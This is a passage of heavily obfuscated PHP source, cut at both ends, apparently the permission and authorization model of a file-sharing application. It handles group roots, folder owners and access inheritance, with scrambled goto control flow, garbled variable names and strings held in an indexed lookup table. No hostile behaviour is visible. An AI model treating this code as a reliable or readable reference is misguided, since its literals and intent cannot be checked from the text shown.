$bçôÛàÆÄŸ[$a‘›‰á¯©ë[478]] != $eÚÎ†ˆÎïá && $this->groupContainUser($bçôÛàÆÄŸ[$a‘›‰á¯©ë[478]], $CŞõó¦Åè)) { foreach ($a‡äÏëŒ—˜[$a‘›‰á¯©ë[1843]] as $fÄĞÃ÷²¾) { $eÁÇæ¤„¾„ = Model($a‘›‰á¯©ë[480])->getInfo($fÄĞÃ÷²¾[$a‘›‰á¯©ë[1667]]); $c°©££’¡ = Model($a‘›‰á¯©ë[501])->getInfoSimpleOuter($CŞõó¦Åè); $c°©££’¡[$a‘›‰á¯©ë[440]] = $fÄĞÃ÷²¾[$a‘›‰á¯©ë[400]]; if (Model($a‘›‰á¯©ë[1836])->authCheckAction($fÄĞÃ÷²¾[$a‘›‰á¯©ë[400]][$a‘›‰á¯©ë[400]], $a‘›‰á¯©ë[1687])) { continue; } $eŠã‘ ÄÎä = array($a‘›‰á¯©ë[28] => $a‘›‰á¯©ë[1457] . $eÁÇæ¤„¾„[$a‘›‰á¯©ë[28]], $a‘›‰á¯©ë[390] => $eÁÇæ¤„¾„[$a‘›‰á¯©ë[84]][$a‘›‰á¯©ë[390]], $a‘›‰á¯©ë[75] => KodIO::make($eÁÇæ¤„¾„[$a‘›‰á¯©ë[84]][$a‘›‰á¯©ë[390]]), $a‘›‰á¯©ë[472] => $a‘›‰á¯©ë[491], $a‘›‰á¯©ë[398] => $a‘›‰á¯©ë[991], $a‘›‰á¯©ë[29] => $a‘›‰á¯©ë[512], $a‘›‰á¯©ë[489] => $eÁÇæ¤„¾„[$a‘›‰á¯©ë[485]], $a‘›‰á¯©ë[1667] => $eÁÇæ¤„¾„[$a‘›‰á¯©ë[1667]], $a‘›‰á¯©ë[482] => $eÁÇæ¤„¾„[$a‘›‰á¯©ë[472]], $a‘›‰á¯©ë[1840] => array($c°©££’¡)); $EÓòø¢»ÑÚ[$eŠã‘ ÄÎä[$a‘›‰á¯©ë[390]]] = $eŠã‘ ÄÎä; } } $f›çÀàõÂ¿ = array(); $E ºÉ¬‹‡† = $this->getAllChildren($c¨ùÙ‘¡ç’); goto AÒ­×Í·; dƒÃÃ‰©•: } public function setAllChildrenByUser($a…ƒ‘›’ğÏ, $aÂâ”õº”´, $dé…æÕöá) { $aËÁÓ®Áñæ =& $_SERVER[¹Ò‹Ò¹]; $aäó¼ßÂóÊ = $this->getAllChildrenByUser($a…ƒ‘›’ğÏ, $aÂâ”õº”´); if (!$dé…æÕöá || !$aäó¼ßÂóÊ) { return !1; } foreach ($aäó¼ßÂóÊ as $Dæ‘‰è×†) { $BˆµÛƒŸ“ = array(); foreach ($Dæ‘‰è×†[$aËÁÓ®Áñæ[1840]] as $fÓŞÌ¡ŒØ§) { $c‡ÚÅ“³Û„ = $fÓŞÌ¡ŒØ§[$aËÁÓ®Áñæ[440]]; $e‚à½™×Í¡ = $fÓŞÌ¡ŒØ§[$aËÁÓ®Áñæ[1504]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $c¨îâÊ„¤ = $fÓŞÌ¡ŒØ§[$aËÁÓ®Áñæ[1504]] ? $fÓŞÌ¡ŒØ§[$aËÁÓ®Áñæ[1504]] : $fÓŞÌ¡ŒØ§[$aËÁÓ®Áñæ[1667]]; if ($fÓŞÌ¡ŒØ§[$aËÁÓ®Áñæ[1504]] && $fÓŞÌ¡ŒØ§[$aËÁÓ®Áñæ[1504]] == $aÂâ”õº”´) { continue; } $BˆµÛƒŸ“[] = array($aËÁÓ®Áñæ[390] => $Dæ‘‰è×†[$aËÁÓ®Áñæ[390]], $aËÁÓ®Áñæ[398] => $e‚à½™×Í¡, $aËÁÓ®Áñæ[478] => intval($c¨îâÊ„¤), $aËÁÓ®Áñæ[1764] => isset($c‡ÚÅ“³Û„[$aËÁÓ®Áñæ[388]]) ? intval($c‡ÚÅ“³Û„[$aËÁÓ®Áñæ[388]]) : 0, $aËÁÓ®Áñæ[1818] => isset($c‡ÚÅ“³Û„[$aËÁÓ®Áñæ[1818]]) ? intval($c‡ÚÅ“³Û„[$aËÁÓ®Áñæ[1818]]) : -1); } $BˆµÛƒŸ“[] = array($aËÁÓ®Áñæ[390] => $Dæ‘‰è×†[$aËÁÓ®Áñæ[390]], $aËÁÓ®Áñæ[398] => SourceModel::TYPE_USER, $aËÁÓ®Áñæ[478] => intval($aÂâ”õº”´), $aËÁÓ®Áñæ[1764] => intval($dé…æÕöá), $aËÁÓ®Áñæ[1818] => -1); $this->where(array($aËÁÓ®Áñæ[404] => $Dæ‘‰è×†[$aËÁÓ®Áñæ[390]]))->delete(); $this->addAll($BˆµÛƒŸ“); } return !0; } public function get($e¹Í¥ÖÀÅ) { $B¶Øµ¨²« = $this->getSourceList(array($e¹Í¥ÖÀÅ), !0); return $B¶Øµ¨²«[0]; } public function getSourceList($E‰öëÔ††ò, $D‹ˆãÙºÙÏ = false, $fÔŒß…†›Ù = false) { goto bØ¨ôÉ†í¤; eÏ©È¬åéá: foreach ($D‹ˆãÙºÙÏ as $Aï¢×¨ï‹ƒ => $c‘ñ«Ğ—“˜) { $cĞçóàëµ = $Eã›Ô»£->parentLevelArray($c‘ñ«Ğ—“˜[$B›ØğİÈ£[481]]); $B›“ïšÏÑÍ = array_merge($B›“ïšÏÑÍ, array($Aï¢×¨ï‹ƒ), array_reverse($cĞçóàëµ)); } $B›“ïšÏÑÍ = array_values(array_unique($B›“ïšÏÑÍ)); if (!$B›“ïšÏÑÍ) { return array(); } goto D¨±ƒÏé†×; aƒôÂ‘Ü™›: $fÆŒ—ƒâÂ = $this->userIsRoot($fÔŒß…†›Ù); $c–õã¤÷ÒÅ = AuthModel::authAll(); $cä£óŸÇ¨Ğ = array($B›ØğİÈ£[401] => $c–õã¤÷ÒÅ, $B›ØğİÈ£[1845] => array($B›ØğİÈ£[406] => 0, $B›ØğİÈ£[1673] => $c–õã¤÷ÒÅ, $B›ØğİÈ£[407] => LNG($B›ØğİÈ£[1846]), $B›ØğİÈ£[1688] => $B›ØğİÈ£[1847])); goto döÜ½“­×Ö; döÜ½“­×Ö: $Aá–ŒâŸ‡ğ = array(); foreach ($D‹ˆãÙºÙÏ as $aÒµí¸³×  => $FÆ”Šš„È) { if ($fÆŒ—ƒâÂ) { $Aá–ŒâŸ‡ğ[$aÒµí¸³× ] = $cä£óŸÇ¨Ğ; continue; } $Aá–ŒâŸ‡ğ[$aÒµí¸³× ] = $this->makeSourceAuth($FÆ”Šš„È, $AÏ¸ä°¦, $fÔŒß…†›Ù); } return $Aá–ŒâŸ‡ğ; goto BÎÙÁ‚¹…Ã; eí‚‘Ä¿ï‘: if (!$D‹ˆãÙºÙÏ && count($E‰öëÔ††ò) == 1) { $D‹ˆãÙºÙÏ = array(); $D‹ˆãÙºÙÏ[$E‰öëÔ††ò[0]] = $Eã›Ô»£->sourceInfo($E‰öëÔ††ò[0]); } if (!$D‹ˆãÙºÙÏ) { $bõÑö˜Á‰ = array($B›ØğİÈ£[404] => array($B›ØğİÈ£[405], $E‰öëÔ††ò)); $D‹ˆãÙºÙÏ = $Eã›Ô»£->field($B›ØğİÈ£[1844])->where($bõÑö˜Á‰)->select(); $D‹ˆãÙºÙÏ = array_to_keyvalue($D‹ˆãÙºÙÏ, $B›ØğİÈ£[390]); } $B›“ïšÏÑÍ = $E‰öëÔ††ò; goto eÏ©È¬åéá; D¨±ƒÏé†×: $e¾ç²¼Îö… = $this->sourceAuthSelect($B›“ïšÏÑÍ); $AÏ¸ä°¦ = array(); foreach ($B›“ïšÏÑÍ as $aÒµí¸³× ) { if (isset($e¾ç²¼Îö…[$aÒµí¸³× ])) { $AÏ¸ä°¦[$aÒµí¸³× ] = $e¾ç²¼Îö…[$aÒµí¸³× ]; } } goto aƒôÂ‘Ü™›; bØ¨ôÉ†í¤: $B›ØğİÈ£ =& $_SERVER[¹Ò‹Ò¹]; if (!$E‰öëÔ††ò) { return array(); } $Eã›Ô»£ = Model($B›ØğİÈ£[1179]); goto eí‚‘Ä¿ï‘; BÎÙÁ‚¹…Ã: } public function authDeepCheck($a²Ò­é™º, $C¼Şİğáº = false) { goto eñÓÁˆ£……; eñÓÁˆ£……: $B´ƒ±­§’Ğ =& $_SERVER[¹Ò‹Ò¹]; $C¼Şİğáº = $C¼Şİğáº ? $C¼Şİğáº : USER_ID; $dæñÅëœè¯ = $this->makeAuthDeep($C¼Şİğáº); goto C’Œ“ê¬ß; C’Œ“ê¬ß: if (!in_array($a²Ò­é™º, $dæñÅëœè¯[$B´ƒ±­§’Ğ[1848]])) { return !1; } $A¿Í»Ë™¢¦ = array(); foreach ($dæñÅëœè¯[$B´ƒ±­§’Ğ[1849]] as $A¸Ï…–¤å => $eˆä¾Ÿëï) { if (!in_array($a²Ò­é™º, $eˆä¾Ÿëï)) { continue; } $A¿Í»Ë™¢¦[] = $A¸Ï…–¤å; } goto dá‡Ïå®õ…; dá‡Ïå®õ…: if (!$A¿Í»Ë™¢¦) { return !1; } $FºŞïßö¦² = $A¿Í»Ë™¢¦ ? $A¿Í»Ë™¢¦[0] : $a²Ò­é™º; return array($B´ƒ±­§’Ğ[401] => -1, $B´ƒ±­§’Ğ[440] => array($B´ƒ±­§’Ğ[406] => $B´ƒ±­§’Ğ[1060], $B´ƒ±­§’Ğ[1673] => $B´ƒ±­§’Ğ[491], $B´ƒ±­§’Ğ[407] => LNG($B´ƒ±­§’Ğ[1850]), $B´ƒ±­§’Ğ[1688] => $B´ƒ±­§’Ğ[1851]), $B´ƒ±­§’Ğ[1852] => LNG($B´ƒ±­§’Ğ[1853]), $B´ƒ±­§’Ğ[1854] => $this->sourceAuthInfo($FºŞïßö¦²)); goto CãâŠ§«ÛÆ; CãâŠ§«ÛÆ: } protected function makeAuthDeep($D¡õÃµÛğ = false) { goto a†‰Â¦ÍÌİ; C‹†Õâù¾: $dŠ‘ÌÜÂÌ­ = array(); if ($eôéÒÖôÙö) { $eî¯­‚·— = $cŒ¤Ç¸->where(array($c¥×ÔÔ‡Ğ[390] => array($c¥×ÔÔ‡Ğ[405], $eôéÒÖôÙö)))->select(); foreach ($eî¯­‚·— as $dÀ¤Ôí×ç) { $AÖÈ®ºõµ = $cŒ¤Ç¸->parentLevelArray($dÀ¤Ôí×ç[$c¥×ÔÔ‡Ğ[481]]); $c¬¹ÚçÓ¢Ë = array_merge($c¬¹ÚçÓ¢Ë, $AÖÈ®ºõµ); $ešÃÁÔ‰È[] = $dÀ¤Ôí×ç[$c¥×ÔÔ‡Ğ[478]]; $c‚¦ùÕêŠ—[$dÀ¤Ôí×ç[$c¥×ÔÔ‡Ğ[390]]] = $AÖÈ®ºõµ; $B­êš„·÷¥[$dÀ¤Ôí×ç[$c¥×ÔÔ‡Ğ[390]]] = $dÀ¤Ôí×ç[$c¥×ÔÔ‡Ğ[478]]; } } $ešÃÁÔ‰È = array_values(array_unique($ešÃÁÔ‰È)); goto c”³ŒÀÊÀ; EŞÙë£‰Ò: foreach ($b–©¾ê³»Ã as $fâäíÂÕİ¥) { if ($fâäíÂÕİ¥[$c¥×ÔÔ‡Ğ[400]] == 0 && $fâäíÂÕİ¥[$c¥×ÔÔ‡Ğ[1689]] == $c¥×ÔÔ‡Ğ[86]) { $d‡óª¶¶Û[] = $fâäíÂÕİ¥[$c¥×ÔÔ‡Ğ[388]]; } } $cªĞ»êÏ = $this->userGroupParents($D¡õÃµÛğ); $B·›¨Æè¥ = array($c¥×ÔÔ‡Ğ[398] => SourceModel::TYPE_USER, $c¥×ÔÔ‡Ğ[478] => $D¡õÃµÛğ); goto bÅƒ«Â‡ê; a©ƒ¾ÄÌ²›: $FÁĞî¬‹ù = array($c¥×ÔÔ‡Ğ[1848] => $c¬¹ÚçÓ¢Ë, $c¥×ÔÔ‡Ğ[1849] => $c‚¦ùÕêŠ—); $d˜´ºª«ÁŠ[$D¡õÃµÛğ] = $FÁĞî¬‹ù; return $FÁĞî¬‹ù; goto DÇøäÚ„Û; Cî©Ç×ê÷•: foreach ($ešÃÁÔ‰È as $C’Ï¿”Ûì’) { $F‡Œ•È‰¢ = $bÜá×Ü¾¿->getInfo($C’Ï¿”Ûì’); $c¬¹ÚçÓ¢Ë[] = $F‡Œ•È‰¢[$c¥×ÔÔ‡Ğ[84]][$c¥×ÔÔ‡Ğ[390]]; $FïÂÔÀåÕË[$C’Ï¿”Ûì’] = $F‡Œ•È‰¢[$c¥×ÔÔ‡Ğ[84]][$c¥×ÔÔ‡Ğ[390]]; $dŠ‘ÌÜÂÌ­[$C’Ï¿”Ûì’] = $cŒ¤Ç¸->parentLevelArray($F‡Œ•È‰¢[$c¥×ÔÔ‡Ğ[481]]); } foreach ($c‚¦ùÕêŠ— as $A°Ş«‚ÑÓæ => $båÂÚ¾ùù) { $cõĞİê¸¸‡ = $B­êš„·÷¥[$A°Ş«‚ÑÓæ]; if (!$cõĞİê¸¸‡ || !$FïÂÔÀåÕË[$cõĞİê¸¸‡]) { continue; } $d®ƒÙ™¶Ò = array(); foreach ($dŠ‘ÌÜÂÌ­[$cõĞİê¸¸‡] as $C’Ï¿”Ûì’) { $d®ƒÙ™¶Ò[] = $FïÂÔÀåÕË[$C’Ï¿”Ûì’]; } $c‚¦ùÕêŠ—[$A°Ş«‚ÑÓæ] = array_merge($d®ƒÙ™¶Ò, $båÂÚ¾ùù); } $c¬¹ÚçÓ¢Ë = array_values(array_unique($c¬¹ÚçÓ¢Ë)); goto a©ƒ¾ÄÌ²›; CèáÅºØì§: $ešÃÁÔ‰È = $cªĞ»êÏ; $cŒ¤Ç¸ = Model($c¥×ÔÔ‡Ğ[1179]); $bÜá×Ü¾¿ = Model($c¥×ÔÔ‡Ğ[480]); goto E¼Õ¼¤Øùø; a†‰Â¦ÍÌİ: $c¥×ÔÔ‡Ğ =& $_SERVER[¹Ò‹Ò¹]; static $d˜´ºª«ÁŠ = array(); $D¡õÃµÛğ = $D¡õÃµÛğ ? $D¡õÃµÛğ : USER_ID; goto f†¬¸‘¼Ê; c”³ŒÀÊÀ: $cº¨±°ìÍ = $ešÃÁÔ‰È; foreach ($cº¨±°ìÍ as $C’Ï¿”Ûì’) { $F‡Œ•È‰¢ = $bÜá×Ü¾¿->getInfo($C’Ï¿”Ûì’); $AÖÈ®ºõµ = $cŒ¤Ç¸->parentLevelArray($F‡Œ•È‰¢[$c¥×ÔÔ‡Ğ[481]]); $ešÃÁÔ‰È = array_merge($ešÃÁÔ‰È, $AÖÈ®ºõµ); } $ešÃÁÔ‰È = array_values(array_unique($ešÃÁÔ‰È)); goto Cî©Ç×ê÷•; eğËíéÇŸå: $DÈ½–šôáİ = array_to_keyvalue_group($eîàíÄ³ , $c¥×ÔÔ‡Ğ[390]); foreach ($DÈ½–šôáİ as $CµØ“â·ß« => $d‡¯Ûáë±) { $Bµ™—‰åÔ = $this->authArrayCheck($d‡¯Ûáë±, $D¡õÃµÛğ); if ($Bµ™—‰åÔ[$c¥×ÔÔ‡Ğ[401]] > 0) { $eôéÒÖôÙö[] = $CµØ“â·ß« . $c¥×ÔÔ‡Ğ[33]; } } $c¬¹ÚçÓ¢Ë = array(); goto CèáÅºØì§; E¼Õ¼¤Øùø: $c‚¦ùÕêŠ— = array(); $B­êš„·÷¥ = array(); $FïÂÔÀåÕË = array(); goto C‹†Õâù¾; f†¬¸‘¼Ê: if (isset($d˜´ºª«ÁŠ[$D¡õÃµÛğ])) { return $d˜´ºª«ÁŠ[$D¡õÃµÛğ]; } $b–©¾ê³»Ã = Model($c¥×ÔÔ‡Ğ[1855])->listData(); $d‡óª¶¶Û = array(); goto EŞÙë£‰Ò; bÅƒ«Â‡ê: if ($cªĞ»êÏ) { $B·›¨Æè¥ = array(array($c¥×ÔÔ‡Ğ[398] => SourceModel::TYPE_USER, $c¥×ÔÔ‡Ğ[478] => $D¡õÃµÛğ), array($c¥×ÔÔ‡Ğ[398] => SourceModel::TYPE_GROUP, $c¥×ÔÔ‡Ğ[478] => array($c¥×ÔÔ‡Ğ[405], $cªĞ»êÏ)), $c¥×ÔÔ‡Ğ[933] => $c¥×ÔÔ‡Ğ[1756]); } $eîàíÄ³  = $this->field($c¥×ÔÔ‡Ğ[1856])->where($B·›¨Æè¥)->select(); $eôéÒÖôÙö = array(); goto eğËíéÇŸå; DÇøäÚ„Û: } private function makeSourceAuth($CîÏØñ©Ãù, $d¼£¦¹¥ö°, $AÍØ”…Ñ¶é = false) { goto Cô‚º§ì; a‡«Åé„ßŒ: if (!$bØ¸¾ˆÊá÷) { $a„äÕ…¹‚… = Model($déÅº¾™‚[480])->getInfo($d£´›­Íö°); $F‡ˆÌ–Ûˆµ = explode($déÅº¾™‚[47], trim($a„äÕ…¹‚…[$déÅº¾™‚[481]], $déÅº¾™‚[47])); $F‡ˆÌ–Ûˆµ = array_reverse($F‡ˆÌ–Ûˆµ); foreach ($F‡ˆÌ–Ûˆµ as $DõÛ«ÔË) { if ($DõÛ«ÔË == $déÅº¾™‚[491] || $DõÛ«ÔË == $D–ÂÌªî¥) { continue; } $E‚Ø«ê•ƒ„ = $this->groupRootAuth($DõÛ«ÔË, $AÍØ”…Ñ¶é); if (!$E‚Ø«ê•ƒ„) { continue; } $bØ¸¾ˆÊá÷ = $this->groupAuthInfo($E‚Ø«ê•ƒ„, $DõÛ«ÔË); break; } } if (!$bØ¸¾ˆÊá÷ || $bØ¸¾ˆÊá÷[$déÅº¾™‚[401]] <= 0) { $e§Üæ©š”« = $this->authDeepCheck($CîÏØñ©Ãù[$déÅº¾™‚[390]], $AÍØ”…Ñ¶é); if ($e§Üæ©š”«) { $bØ¸¾ˆÊá÷ = $e§Üæ©š”«; } } return $bØ¸¾ˆÊá÷; goto F´‚îëñ°©; eÂéÑ„‹¶: $e±£ÇÔêÅ = Model($déÅº¾™‚[1179])->parentLevelArray($CîÏØñ©Ãù[$déÅº¾™‚[481]]); $e±£ÇÔêÅ = array_merge(array($CîÏØñ©Ãù[$déÅº¾™‚[390]]), array_reverse($e±£ÇÔêÅ)); $bØ¸¾ˆÊá÷ = !1; goto d«˜—ÒÊÀï; d«˜—ÒÊÀï: foreach ($e±£ÇÔêÅ as $d”ù‘‹Ë±) { if (!isset($d¼£¦¹¥ö°[$d”ù‘‹Ë±])) { continue; } $dÉ¥Ó‘àå¿ = $this->authMake($d¼£¦¹¥ö°[$d”ù‘‹Ë±], $AÍØ”…Ñ¶é); if ($dÉ¥Ó‘àå¿[$déÅº¾™‚[440]]) { $bØ¸¾ˆÊá÷ = $dÉ¥Ó‘àå¿; break; } } if (!$c–Ç¼É¬¿Ã) { return $bØ¸¾ˆÊá÷; } if (!$bØ¸¾ˆÊá÷ && $eøÅ»“Ü) { $bØ¸¾ˆÊá÷ = $this->groupAuthInfo($eøÅ»“Ü, $d£´›­Íö°); } goto a‡«Åé„ßŒ; Cô‚º§ì: $déÅº¾™‚ =& $_SERVER[¹Ò‹Ò¹]; $D–ÂÌªî¥ = $déÅº¾™‚[86]; $d£´›­Íö° = $CîÏØñ©Ãù[$déÅº¾™‚[478]]; goto Fï¡éµÁ˜; Fï¡éµÁ˜: $c–Ç¼É¬¿Ã = $CîÏØñ©Ãù[$déÅº¾™‚[398]] == SourceModel::TYPE_GROUP; $eøÅ»“Ü = $c–Ç¼É¬¿Ã ? $this->groupRootAuth($d£´›­Íö°, $AÍØ”…Ñ¶é) : !1; if ($eøÅ»“Ü && Model($déÅº¾™‚[1836])->authCheckAction($eøÅ»“Ü[$déÅº¾™‚[400]], $déÅº¾™‚[1687])) { return $this->groupAuthInfo($eøÅ»“Ü, $d£´›­Íö°); } goto eÂéÑ„‹¶; F´‚îëñ°©: } private function userIsRoot($e¦‚°öË« = false) { $A»ƒ°½¾â =& $_SERVER[¹Ò‹Ò¹]; if (!$e¦‚°öË« && _get($GLOBALS, $A»ƒ°½¾â[479])) { return !0; } $aíï¦ºà = Model($A»ƒ°½¾â[501])->getInfo($e¦‚°öË«); $bßªãìÌö¹ = Model($A»ƒ°½¾â[1857])->listData($aíï¦ºà[$A»ƒ°½¾â[1389]]); if ($bßªãìÌö¹ && $bßªãìÌö¹[$A»ƒ°½¾â[1258]][$A»ƒ°½¾â[1858]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Fë¡äç…ÒÕ) { goto a”Œ­ĞŠŠµ; Eˆ»ÖÓ´ÜÃ: if (!$A˜ßò£Ñ¯Î) { return !1; } $c™í¾×…©->groupPathDisplay($A˜ßò£Ñ¯Î); $aæ´‘ÛË = array($A˜ßò£Ñ¯Î); goto f‹¿«ˆ©Úï; f‹¿«ˆ©Úï: $aæ´‘ÛË = $c™í¾×…©->_listAppendPath($aæ´‘ÛË); $A˜ßò£Ñ¯Î = $aæ´‘ÛË[0]; $eÆæç¿Ù³ = $A˜ßò£Ñ¯Î[$c¢õµ‹†ß[489]]; goto Dßñ‹²èâ†; Dßñ‹²èâ†: if (isset($A˜ßò£Ñ¯Î[$c¢õµ‹†ß[486]])) { $b¥´„œ = explode($c¢õµ‹†ß[8], trim($A˜ßò£Ñ¯Î[$c¢õµ‹†ß[489]], $c¢õµ‹†ß[8])); array_shift($b¥´„œ); $eÆæç¿Ù³ = $A˜ßò£Ñ¯Î[$c¢õµ‹†ß[484]] . $c¢õµ‹†ß[1859] . implode($c¢õµ‹†ß[8], $b¥´„œ); } return array($c¢õµ‹†ß[407] => $A˜ßò£Ñ¯Î[$c¢õµ‹†ß[28]], $c¢õµ‹†ß[75] => KodIO::make($A˜ßò£Ñ¯Î[$c¢õµ‹†ß[390]]), $c¢õµ‹†ß[1860] => $eÆæç¿Ù³); goto a¬¶†Ç¸Ãœ; a”Œ­ĞŠŠµ: $c¢õµ‹†ß =& $_SERVER[¹Ò‹Ò¹]; $c™í¾×…© = Model($c¢õµ‹†ß[1179]); $A˜ßò£Ñ¯Î = $c™í¾×…©->sourceInfo($Fë¡äç…ÒÕ); goto Eˆ»ÖÓ´ÜÃ; a¬¶†Ç¸Ãœ: } private function groupAuthInfo($d¥Åå©œ¼ö, $aëÆé­ÂÃ) { $f¶Ù²òñ™ä =& $_SERVER[¹Ò‹Ò¹]; $e ¿‹Ïğ®Ô = Model($f¶Ù²òñ™ä[480])->getInfo($aëÆé­ÂÃ); return array($f¶Ù²òñ™ä[1861] => intval($d¥Åå©œ¼ö[$f¶Ù²òñ™ä[400]]), $f¶Ù²òñ™ä[1845] => $d¥Åå©œ¼ö, $f¶Ù²òñ™ä[1862] => LNG($f¶Ù²òñ™ä[1863]), $f¶Ù²òñ™ä[1854] => array($f¶Ù²òñ™ä[407] => $e ¿‹Ïğ®Ô[$f¶Ù²òñ™ä[28]], $f¶Ù²òñ™ä[75] => KodIO::make($e ¿‹Ïğ®Ô[$f¶Ù²òñ™ä[84]][$f¶Ù²òñ™ä[390]]), $f¶Ù²òñ™ä[1860] => $e ¿‹Ïğ®Ô[$f¶Ù²òñ™ä[485]])); } protected function groupRootAuth($aÒ·Œ¢ëÍ, $eè—ğğßĞï = false) { goto c·¶ó‘á¡; cí‘¦÷Ì†×: $aÖÚĞŒñ„˜ = $this->sourceAuthSelect($a—ß¥½Êë[$e¶Í™Ñ¡ĞÂ[84]][$e¶Í™Ñ¡ĞÂ[390]]); $e‹¾‚†Ëç– = $aÖÚĞŒñ„˜ ? $this->authMake($aÖÚĞŒñ„˜, $eè—ğğßĞï) : !1; $a‡ñÕò¥ôê = $e‹¾‚†Ëç– ? $e‹¾‚†Ëç–[$e¶Í™Ñ¡ĞÂ[440]] : !1; goto A‡Ëœ÷š»; c·¶ó‘á¡: $e¶Í™Ñ¡ĞÂ =& $_SERVER[¹Ò‹Ò¹]; $eè—ğğßĞï = $eè—ğğßĞï ? $eè—ğğßĞï : USER_ID; $f¼™Œ‡˜÷ = $eè—ğğßĞï . $e¶Í™Ñ¡ĞÂ[1864] . $aÒ·Œ¢ëÍ; goto C‚„ªßÃÑ‹; C‚„ªßÃÑ‹: static $dŒ±î÷áÅÇ = array(); if (isset($dŒ±î÷áÅÇ[$f¼™Œ‡˜÷])) { return $dŒ±î÷áÅÇ[$f¼™Œ‡˜÷]; } $a—ß¥½Êë = Model($e¶Í™Ñ¡ĞÂ[480])->getInfo($aÒ·Œ¢ëÍ); goto c„±©–¶…â; A‡Ëœ÷š»: $dŒ±î÷áÅÇ[$f¼™Œ‡˜÷] = $a‡ñÕò¥ôê ? $a‡ñÕò¥ôê : $A¬¿öõßï„; return $dŒ±î÷áÅÇ[$f¼™Œ‡˜÷]; goto EÆÛíĞäô; c„±©–¶…â: $C½ŸºÒàÌ‹ = $this->userGroupList($eè—ğğßĞï); $A¬¿öõßï„ = isset($C½ŸºÒàÌ‹[$aÒ·Œ¢ëÍ]) ? $C½ŸºÒàÌ‹[$aÒ·Œ¢ëÍ][$e¶Í™Ñ¡ĞÂ[400]] : !1; if ($A¬¿öõßï„ && Model($e¶Í™Ñ¡ĞÂ[1836])->authCheckAction($A¬¿öõßï„[$e¶Í™Ñ¡ĞÂ[400]], $e¶Í™Ñ¡ĞÂ[1687])) { $dŒ±î÷áÅÇ[$f¼™Œ‡˜÷] = $A¬¿öõßï„; return $A¬¿öõßï„; } goto cí‘¦÷Ì†×; EÆÛíĞäô: } public function authOwnerApply($e¡İâ©ÛÒ‡) { goto FùÜšÍÍ…; CÎ‡Ñ¸¡º‹: $e¡İâ©ÛÒ‡[$cÈ¥©…ğ›[400]][$cÈ¥©…ğ›[1867]] = Model($cÈ¥©…ğ›[497])->userListInfo($b¤¿¬Å„ÛÙ); return $e¡İâ©ÛÒ‡; goto cƒË¶Éö; FùÜšÍÍ…: $cÈ¥©…ğ› =& $_SERVER[¹Ò‹Ò¹]; if (empty($e¡İâ©ÛÒ‡[$cÈ¥©…ğ›[400]]) || isset($e¡İâ©ÛÒ‡[$cÈ¥©…ğ›[1865]]) && $e¡İâ©ÛÒ‡[$cÈ¥©…ğ›[1865]]) { return $e¡İâ©ÛÒ‡; } if (AuthModel::authCheckRoot($e¡İâ©ÛÒ‡[$cÈ¥©…ğ›[400]][$cÈ¥©…ğ›[401]])) { return $e¡İâ©ÛÒ‡; } goto DÃÍäù…ª×; Fäß¼Üï‚: if (count($b¤¿¬Å„ÛÙ) == 0) { $b¤¿¬Å„ÛÙ = $this->authFolderOwnerGroup($e¡İâ©ÛÒ‡[$cÈ¥©…ğ›[478]]); } $b¤¿¬Å„ÛÙ = array_unique($b¤¿¬Å„ÛÙ); if (AuthModel::authCheckRoot($e¡İâ©ÛÒ‡[$cÈ¥©…ğ›[400]][$cÈ¥©…ğ›[401]])) { $b¤¿¬Å„ÛÙ[] = USER_ID; } goto CÎ‡Ñ¸¡º‹; DÃÍäù…ª×: $fÊ·¥îŒÔ² = Model($cÈ¥©…ğ›[1179])->parentLevelArray($e¡İâ©ÛÒ‡[$cÈ¥©…ğ›[481]]); $fÊ·¥îŒÔ² = array_merge(array($e¡İâ©ÛÒ‡[$cÈ¥©…ğ›[390]]), array_reverse($fÊ·¥îŒÔ²)); $D°ˆÑç‘”Î = $this->sourceAuthSelect($fÊ·¥îŒÔ²); goto B¡Ç­ó¯ìğ; B¡Ç­ó¯ìğ: $Eï™”´ä¦ = array(); $b¤¿¬Å„ÛÙ = array(); foreach ($D°ˆÑç‘”Î as $CÌÕø¶°ƒí => $bŒ‰ø·ÂôÛ) { $cÚ›Ó¸Œ¹ = $this->authFolderOwnerUser($bŒ‰ø·ÂôÛ); $Eï™”´ä¦[$CÌÕø¶°ƒí] = $cÚ›Ó¸Œ¹; $b¤¿¬Å„ÛÙ = array_merge($b¤¿¬Å„ÛÙ, $cÚ›Ó¸Œ¹[$cÈ¥©…ğ›[557]]); if ($cÚ›Ó¸Œ¹[$cÈ¥©…ğ›[1866]]) { break; } } goto Fäß¼Üï‚; cƒË¶Éö: } private function authFolderOwnerGroup($b³±°œÏ™) { $cßÓÖÒ–¹º =& $_SERVER[¹Ò‹Ò¹]; $F±ó³çƒÔ = Model($cßÓÖÒ–¹º[1750])->where(array($cßÓÖÒ–¹º[1667] => $b³±°œÏ™))->select(); $aÈÊÜõ = array(); if (!$F±ó³çƒÔ) { return $aÈÊÜõ; } foreach ($F±ó³çƒÔ as $dÌ¸™Ú‰) { $CŞãóÂ»ñ = $this->authInfo($dÌ¸™Ú‰); if (AuthModel::authCheckRoot($CŞãóÂ»ñ[$cßÓÖÒ–¹º[400]])) { $aÈÊÜõ[] = $dÌ¸™Ú‰[$cßÓÖÒ–¹º[1504]]; } } return $aÈÊÜõ; } private function authFolderOwnerUser($cšÈ²ŠËá¹) { $e‘É¡‘¸İ =& $_SERVER[¹Ò‹Ò¹]; $d¥İœßó–ˆ = array(); $D¶³Ä´ê®â = !1; foreach ($cšÈ²ŠËá¹ as $B¼¸‘×³â) { $b„õˆºò‰ = $this->authInfo($B¼¸‘×³â); if ($B¼¸‘×³â[$e‘É¡‘¸İ[478]] == $e‘É¡‘¸İ[491]) { $D¶³Ä´ê®â = !0; } if ($B¼¸‘×³â[$e‘É¡‘¸İ[398]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($b„õˆºò‰[$e‘É¡‘¸İ[400]])) { $d¥İœßó–ˆ[] = $B¼¸‘×³â[$e‘É¡‘¸İ[478]]; } } } return array($e‘É¡‘¸İ[557] => $d¥İœßó–ˆ, $e‘É¡‘¸İ[1866] => $D¶³Ä´ê®â); } public function authMake($CôˆÑ×Ñ, $bÓ‰²£¸ù = false) { $E›æî÷Ø =& $_SERVER[¹Ò‹Ò¹]; $cœöàÕô¼ = $this->authArrayCheck($CôˆÑ×Ñ, $bÓ‰²£¸ù); if ($cœöàÕô¼[$E›æî÷Ø[1868]]) { $cœöàÕô¼[$E›æî÷Ø[1868]] = 